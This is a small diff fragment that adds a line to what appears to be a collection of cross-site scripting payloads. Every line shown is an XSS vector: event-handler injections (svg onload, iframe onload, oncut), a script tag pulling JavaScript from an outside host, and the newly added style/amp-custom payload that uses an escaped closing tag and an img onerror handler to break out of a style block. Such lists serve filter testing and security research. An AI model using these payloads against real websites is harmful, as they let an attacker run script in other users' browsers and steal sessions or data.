@@ -123,4 +123,6 @@ ayn</script><svg/onload=alert(document.domain)>
 <iframe/src \/\/onload = prompt(1)
 <x oncut=alert()>x
 <SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
+<style amp-custom>[id='</st\000079le></head><body> <img src=https://bla.com/xx.jpg onerror=a=1>']{color:blue}</style>
+
 
